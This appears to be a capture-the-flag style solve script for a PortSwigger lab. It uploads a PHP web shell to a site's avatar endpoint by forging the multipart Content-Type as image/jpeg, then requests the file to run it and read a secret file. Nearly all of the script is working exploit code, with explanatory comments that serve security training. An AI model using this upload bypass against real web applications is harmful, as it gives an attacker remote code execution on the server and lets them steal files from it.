# Lab 02 — Web shell upload via Content-Type restriction bypass
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
#
# Vulnerability: The server checks the client-controlled Content-Type
#                header of the uploaded file, rather than its actual content
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   Upload exploit.php but declare Content-Type: image/jpeg in the
#   multipart body — the file's actual content is unchanged PHP, but the
#   server only checks the (forgeable) header.
#
# Usage: python file_upload_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                PHP_PAYLOAD, upload_avatar, find_avatar_url,
                                check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 02 — WEB SHELL UPLOAD VIA CONTENT-TYPE RESTRICTION BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python file_upload_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm the direct upload is blocked ──────────────────────
    print("\n  ── Step 1: confirm a raw PHP upload with an honest Content-Type is blocked\n")
    r_blocked = upload_avatar(session, url, "exploit.php", PHP_PAYLOAD, content_type="application/x-php")
    print(f"  ℹ  Status: {r_blocked.status_code}")
    print_box("Response (should reject)", r_blocked.text[:300])

    # ── Step 2: bypass by forging the Content-Type ────────────────────────
    print("\n  ── Step 2: re-upload with a forged Content-Type: image/jpeg\n")
    r_bypass = upload_avatar(session, url, "exploit.php", PHP_PAYLOAD, content_type="image/jpeg")
    check_status(r_bypass, [200, 302], "Upload with forged image/jpeg Content-Type")

    # ── Step 3: locate and trigger execution ───────────────────────────────
    print("\n  ── Step 3: locate the uploaded file and trigger execution\n")
    avatar_path = find_avatar_url(session, url) or "/files/avatars/exploit.php"
    r_exec = session.get(f"{url}{avatar_path}")
    check_status(r_exec, 200, f"GET {avatar_path}")

    print_box("LEAKED SECRET", r_exec.text.strip())

    print()
    print("  ℹ  Content-Type in a multipart upload is exactly as trustworthy")
    print("     as any other client-supplied header — the file's ACTUAL")
    print("     content never changed; only our claim about it did.")
